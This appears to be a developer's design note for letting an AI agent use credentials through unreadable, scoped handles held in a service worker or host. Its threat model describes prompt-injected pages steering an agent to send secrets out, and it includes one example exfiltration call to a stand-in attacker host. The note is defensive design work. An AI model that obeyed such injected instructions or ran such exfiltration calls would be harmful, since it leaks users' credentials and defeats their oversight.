# Idea: secrets an agent can use but never read

**Status: idea, not started.** Written down on 2026-09-15 to come back to. Nothing here is built, and the sketch
under [Shape](#shape-a-sketch-unvalidated) is a guess to be argued with, not a design.

## The idea

Let an agent act with my credentials (an API token, a session) without the credential ever entering its context,
its tool results, the run log or an export. The model gets a handle it can pass to the places that need it, and
there is no operation that turns the handle back into the secret.

The browser already has this shape: a WebCrypto `CryptoKey` created with `extractable: false` can sign and decrypt,
and no API will hand you its bytes.

It came out of the read-only `exec` dialect ([`docs/dev/readonly-exec.md`](../dev/readonly-exec.md)), where what a
script can express is already the permission. A secret handle is the same move for authority: what the dialect
cannot say, the model cannot do.

## Threat model first

Hiding the value is the easy half. These are the ways a secret leaks anyway, and a design is only as good as its
answer to each.

1. **Exfiltration by destination.** `send({ auth: handle, url: "https://attacker.example/" })`. If the model chooses
   where the credential goes, it is gone, and a prompt injection on the page is exactly what would ask for that. A
   secret has to be bound to where it may be sent, the way `FETCH_SHEET` is hard-locked to `docs.google.com`.
2. **Reflection.** The legitimate destination sends it back: an endpoint that echoes request headers (httpbin's
   `/headers`), an error saying `invalid token ghp_…`, a debug field. The response lands in the model's context. A
   scrubber can remove the exact value and its common encodings (base64, URL-encoding), but a partial or transformed
   echo gets past it: redaction lowers the rate, it does not close the hole.
3. **Authority, not value.** An agent that cannot read a GitHub token can still delete a repository with it. Hiding
   the value does not limit what the value can do. The grant has to be attenuated: which origin, which methods,
   which paths, perhaps read-only.
4. **The page world.** `window.ml`, the read-only dialect and an approved `exec` all run in the page's main world,
   which a hostile page owns: it can patch `fetch`, read any object reachable from a global, and watch outgoing
   requests. So the secret can never be in the page, not even inside a closure. It stays in the service worker, and
   the request that carries it is made there.
5. **Oracles and side channels.** A response that differs by some property of the secret (its length, a prefix
   match on a lookup endpoint) leaks bits over several calls. Unlikely for bearer tokens, worth a sentence per API.
6. **Forged handles.** If a handle is just a name (`"github"`), the model can write one. That is only safe if the
   authority lives in the run's GRANT rather than in the handle: a forged handle then reaches only what the run was
   already allowed to use.

## Shape (a sketch, unvalidated)

- **Secrets live only in the service worker**, stored when I add them, each with a scope written at the same time:
  exact origins, allowed methods, path prefixes, and where it goes in the request (`Authorization: Bearer …`, a
  header name, a cookie).
- **A run is granted secrets by name**, the way a run is given tools today. The grant is what carries authority; the
  handle the model sees (`ml.secret("github")`) is an empty, frozen, null-prototype object holding no data, so
  `JSON.stringify`, `Object.values`, spread and string coercion have nothing to find.
- **The only sink is a background fetch**: something like `ml.fetch(url, { auth: handle })`. The worker checks the
  URL against the secret's scope, injects the credential, makes the request, scrubs the response, and returns it.
- **Approval** does not fit the dialect's rule, because a request has effects. It needs a third category: an effect
  through a declared, scoped capability. Asked once per run and secret, perhaps, and then free inside the scope.
- **Logs and exports** show the handle as `[secret: github]` and never the value, on every surface, including the
  raw model-facing view AGENTS.md requires.

## How it meets the other specs (2026-10-15)

The idea was written before policies, the effect algebra, the process host and the Python dialect existed on paper. Each
of them has a place for it, and together they answer parts of the threat model above.

- **A secret's scope is a policy.** The origins, methods and path prefixes written when the secret is stored are a
  predicate over a call's resolved facts, attached to the secret and evaluated like any other
  ([`POLICIES.md`](POLICIES.md)); it is the fifth hand-rolled grant store in that spec's table. Attenuation (threat 3)
  is then the same mechanism as every other "decide this without asking": a person narrows a scope the way they narrow
  a policy, on the one page that lists them.
- **In the effect algebra a secret is a resource with one operation.** `use(secret(name))` exists; `read(secret(name))`
  does not, in any vocabulary ([`EFFECTS.md`](EFFECTS.md)). A policy can see that a call carries a secret
  (`c.effects.uses("github")`) and bind it to a destination, which is threat 1 as a set predicate. A file the host flags
  as secret-looking is `read(fs(path))` with `secret: true`, excluded from every free tier by name.
- **Processes are a sink**, and the biggest one ([`SHELL.md`](SHELL.md), "Security invariants"). A script names the handle
  in `env` (`{ GITHUB_TOKEN: ml.secret("github") }`); the policy sees the NAME; the host injects the value at spawn,
  into the environment or a credential helper, only for a program whose manifest may receive that secret. Reflection
  (threat 2) is answered where it is cheapest: a process's output is a host-held pointer, and the host scrubs the
  registered values from it before anything crosses or a pipe runs over it (`scrubSecrets` in `src/secret-scrub.ts` is
  the existing form of this, for the backend's own secrets); a program whose manifest says it `echoes` its environment
  is refused with a secret present ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)). In host mode the person's own
  credential files and helpers are on disk, which the secret path flag and the scrubbed environment are for.
- **A secret lives beside its sink.** The worker holds the ones `ml.fetch` injects; the host holds the ones processes
  need (the OS keychain is the natural store); a handle names a secret wherever it lives, and the grant is evaluated
  where decisions are made, in the worker. The value never travels to a place that only decides.
- **On the wire a handle is a tagged name**, `{ "$secret": "github" }`, and never a value in either direction
  ([`ML_WIRE.md`](ML_WIRE.md)). Threat 6 (forged handles) is answered as the sketch hoped: the authority is the run's
  grant, so a forged name reaches only what the run already had.
- **In the Python dialect a handle is a receiver kind with no attributes and no methods**, whose `repr` is
  `[secret: github]`, passable only to an `ml` member whose manifest lists `use(secret)`
  ([`PYTHON_DIALECT.md`](PYTHON_DIALECT.md)). The persistent namespace holds the handle, never a value, because the
  value never enters any Python process. The JS dialect gets the same kind, and a script that names `ml.secret` never
  runs in the page's main world (threat 4), by the rule that already routes `ml.current` and `ml.sh` to an isolated
  world (`execNames` in `src/sw/exec-routing.ts`).
- **The backend's own URL and key are the built-in secret**, already handled this way: never to a page or the model
  (`src/sw/sw-scrub.ts`), never to a process.

## Open questions

- Is per-API scoping bearable to set up, or does it need presets (GitHub read-only, one Google Sheet)?
- Can scrubbing be made good enough for the APIs that matter, or do some APIs have to be marked as echoing and
  refused outright?
- Where does the model's authority stop: can a handle be passed to a server-side tool (OpenWebUI) at all, given
  that the server would then hold it?
- Does this belong in the harness only, or also on the server, for model-provider keys a client should never hold?

## Prior art

- **WebCrypto non-extractable keys**: use without read, enforced by the platform.
- **Object capabilities** (the E language, Mark Miller; SES / Hardened JavaScript): authority carried by unforgeable
  references, attenuated by wrapping them. Sealer/unsealer pairs are close to the handle here.
- **Macaroons**: bearer tokens that carry their own caveats (origin, expiry, path), attenuated by the holder.
- **CI secret masking** (GitHub Actions redacts registered secrets from logs): the redaction half, and a record of
  how often transformed values get past it.
